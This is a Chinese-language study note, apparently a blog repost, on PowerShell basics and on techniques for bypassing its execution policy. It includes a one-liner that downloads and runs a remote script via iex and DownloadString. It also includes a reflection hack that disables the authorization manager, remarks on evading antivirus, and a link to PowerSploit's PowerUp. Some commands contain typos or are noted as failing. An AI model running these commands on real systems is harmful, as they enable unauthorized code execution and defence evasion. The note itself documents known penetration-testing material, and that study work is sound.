 

1 介绍
Windows PowerShell 是一种命令行外壳程序的脚本环境，它内置在每个受支持的Windows版中（Windows7、Windows Server2008 R2及更高版本），为windows命令行使用者和脚本编写者利用.NET Framework的强大功能提供了遍历。

需要.NET环境支持

1.1 特点
win7以上默认安装

脚本可以在内存中运行，不需要写入磁盘

几乎不会出发杀软

可以远程执行

是windows脚本执行更容易

cmd.exe的运行通常会被阻止，但是PowerShell不会被阻止

可用于管理活动目录

1.2 基本概念
1.2.1 .ps1 文件
一个PowerShell脚本其实就是一个简单的文本文件，其扩展名为".ps1"。PowerShell脚本文件中包含一系列命令，每个命令为独立一行。

1.2.2 执行策略
为防止恶意脚本，默认情况下策略为“不能执行”

若无法运行，可使用cmdlet查询当前执行策略

get-executionPolicy
复制
Windows PowerShell get-executionPolicy

Restricted：脚本不能运行（默认设置）

RemoteSigned：在本地创建脚本可以运行，但从网上下载的不能（拥有数字证书签名除外）

AllSigned：仅当脚本受信任的发布者签名时才能运行

Urestricted：允许所有脚本运行

可以使用cmdlet命令设置PowerShell的执行策略

set-ExcutionPolicy <policy name>
复制
1.2.3 运行脚本
必须输入完整路径和问价名，如：

C:\Scripts\a.ps1
复制
1.2.4 管道
作用：将一个命令的输出作为另一个命令的输入，两个命令用 | 连接

get-process p* | stop-process
复制
一个神奇的命令

2 常用命令
2.1 帮助
help
复制
Windows PowerShell帮助

2.2 查看PowerShell版本
get-host
复制
$PSVersionTable.PSVERSION
复制
查看Windows PowerShell版本

查看Windows PowerShell版本

2.3 启动
powershell
复制
Windows PowerShell启动

也可以从cmd输入命令切入

2.4 获取命令
命令很多

Windows PowerShell获取命令

2.5 获取所有进程
get-process
复制
Windows PowerShell获取所有进程

2.6 指定命令重命名
set-alias aaa get-command
复制
Windows PowerShell指定命令重命名

2.7 清屏
cls
复制
clear
复制
3 PowerShell提权
要想运行PowerShell脚本程序，必须使用管理员权限将策略从Restricted改为Unrestricted。

PowerUp.ps1文件可从这里下载

https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

3.1 绕过本地权限并执行
runme.ps1

Write-Host "My voice is my passport, verify me."
复制
3.1.1 获取当前策略
Get-ExecutionPolicy
复制
Windows PowerShell查看当前策略

同样可以将之心执行策略设置为不同级别。

3.1.2 查看支持的所有级别
linux 基本命令也可以用

Set-ExecutionPolicy
复制
Get-ExecutionPolicy -List | Format-Table -Autoize
复制
Windows PowerShell Get-ExecutionPolicy -List

Windows PowerShell向控制台输出一句话失败

如果策略很开放，想使用更严格的方式来测试如下方案，需切换到管理员身份，执行

Set-ExecutionPolicy Restricted

3.2 绕过方式
3.2.1 在交互式PowerShell窗口运行
Windows PowerShell在交互式PowerShell窗口运行

3.2.2 Echo脚本 Pipe到PowerShell的标准输入
引号内如果是中文会报错，未知

Windows PowerShell Echo脚本 Pipe到PowerShell的标准输入

3.2.3 从文件读入脚本 Pipe到PowerShell的标准输入
Get-Content ./runme.ps1 | PowerShell.exe -noprofile -
复制
Type ./runme.ps1 | PowerShell.exe -noprofile -
复制
Windows PowerShell从文件读入脚本 Pipe到PowerShell的标准输入

3.2.4 从一个URL Dowload脚本内容，然后执行
PowerShell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://10.12.120.66:8888/runme.ps1')"
复制
这里一直没测试成功

3.2.5 使用 -command 命令参数
此方法和直接粘贴脚本内容的方式很像，但是此方法不需要一个交互式窗口。它适用于简单脚本执行，对于复杂脚本会发生解析错误。该方法同样不会写内容到磁盘中。

PowerShell -command "Write-Host 'you are good.'"
复制
Windows PowerShell使用 -command 命令参数

可以将该命令写到一个bat文件中，然后放到启动目录中，来帮助提权

3.2.6 使用 -encodedCommand命令参数
此方法很上一个方法很相似，但是此方式脚本内容是 Unicode/base64 encod字符串。

使用编码的好处是可以让你避免执行使用Command参数时产生一些糟糕的解析问题

image-20210905224814953

3.2.7 Invoke-Command 命令
该方法最好的在对对抗PowerShell remoting开启的Remote系统

invoke-command -scriptblock {Write-Host "You are good."}
复制
Windows PowerShell Invoke-Command 命令

如下命令可以来从一个远程系统上抓区执行策略，同时运用到本地计算机中

invoke-command -computername Server01 -scriptblock {get-executionpolicy} | set-executionpolicy -force
复制
3.2.8 使用Invoke-Expression命令
Get-Content ./runme.ps1 | Invoke-Expression
复制
gc ./runme.ps1 | iex
复制
测试均未生效

3.2.9 使用Bypass执行策略标志
这个方法时微软提供的用来绕过执行策略的一种方式。当指定白标志后，即视为什么都不做，什么警告都不提示

PowerShell -ExecutionPolicy bypass -File ./runme.ps1
复制
[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-IOnKv7Jv-1630949007798)(Windows PowerShell使用Bypass执行策略标志.png)]

3.2.10 使用Unrestricted执行策略标志
该标志和bypass很像，但是当使用该标志时，意味着加载所有的配置文件和执行所有的脚本

PowerShell -ExecutionPolicy unrestricted -File ./runme.ps1
复制
Windows PowerShell使用Unrestricted执行策略标志

3.2.11 使用Remote-Signed执行策略标志
创建脚本，然后按签名指南，最后运行

签名指南：https://www.darkoperator.com/blog/2013/3/5/powershell-basics-execution-policy-part-1.html

PowerShell.exe -ExecutionPolicy Remote-signed -File ./runme.ps1
复制
未测试成功

3.2.12 通过换出认证管理器，禁用执行策略
如果函数可以在交互式窗口中使用，也可以在Command参数中指定。

一旦该函数被执行，则会认证管理器，同时默认策略改为unrestricted。

该方法只在一个会话范围内有效。

function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))} Disable-ExecutionPolicy ./runme.ps1
复制
disable-ExecutionPolicy
复制
./runme.ps1
复制
Windows PowerShell通过换出认证管理器，禁用执行策略

3.2.13 设置执行策略为Process作用域
执行策略可以应用到各个级别，其中包括完全控制process。使用该方法仅限于session中，执行策略会变为unrestricted

Set-ExecutionPolicy Bypass -Scope Process
复制
Windows PowerShell设置执行策略为Process作用域

3.2.14 通过命令设置执行策略为CurrentUser作用域
Set-ExecutionPolicy -Scopr CurrentUser ExecutionPolucy UnRestricted
复制
命令报错

3.2.15 通过注册表设置执行策略为CurrentUser作用域
HKEY_CURRENT_USER\Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell
